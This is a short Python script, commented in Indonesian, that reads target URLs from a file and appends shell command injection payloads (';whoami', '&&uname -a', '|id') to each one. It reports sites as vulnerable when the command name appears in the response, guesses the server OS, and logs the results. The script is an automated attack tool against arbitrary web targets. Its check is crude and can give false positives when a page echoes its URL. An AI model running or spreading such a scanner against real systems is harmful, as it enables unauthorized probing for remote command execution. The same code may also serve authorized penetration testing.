#!/usr/bin/env python3
"""
Skrip Otomatis Command Injection Scanner

- Membaca daftar target dari file 'targets.txt' (satu URL per baris)
- Mendeteksi command injection dengan pola payload standar
- Menyimpan hasil ke file 'hasil.txt'
- Cukup jalankan: python cmd_injection_tool.py
"""
import requests

def detect_vulnerability(url, commands=None, payload_patterns=None, timeout=5):
    """
    Mendeteksi apakah URL rentan terhadap command injection.
    Mengembalikan tuple (is_vulnerable: bool, os_type: str).
    """
    if commands is None:
        commands = ['whoami', 'uname -a', 'id']
    if payload_patterns is None:
        payload_patterns = [';{}', '&&{}', '|{}']

    for pattern in payload_patterns:
        for cmd in commands:
            payload = pattern.format(cmd)
            target = url.rstrip('?&') + payload
            try:
                resp = requests.get(target, timeout=timeout)
                if cmd in resp.text:
                    os_type = 'Linux' if 'Linux' in resp.text else 'Windows'
                    return True, os_type
            except requests.RequestException:
                pass
    return False, '-'


def main():
    input_file = 'targets.txt'
    output_file = 'hasil.txt'
    timeout = 5

    try:
        with open(input_file, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"File '{input_file}' tidak ditemukan. Silakan buat file targets.txt dengan daftar URL.")
        return

    results = []
    print("[*] Memulai scanning command injection...")
    for url in urls:
        print(f"[ ] Memeriksa {url} ...", end=' ')
        vulnerable, os_type = detect_vulnerability(url, timeout=timeout)
        if vulnerable:
            print(f"RENTAN (OS: {os_type})")
            results.append(f"[VULNERABLE] {url} | OS: {os_type}")
        else:
            print("TIDAK RENTAN")
            results.append(f"[NOT VULNERABLE] {url}")

    # Simpan hasil ke file
    with open(output_file, 'w') as f:
        for line in results:
            f.write(line + "\n")

    print(f"[+] Selesai. Hasil scan disimpan di '{output_file}'.")

if __name__ == '__main__':
    main()
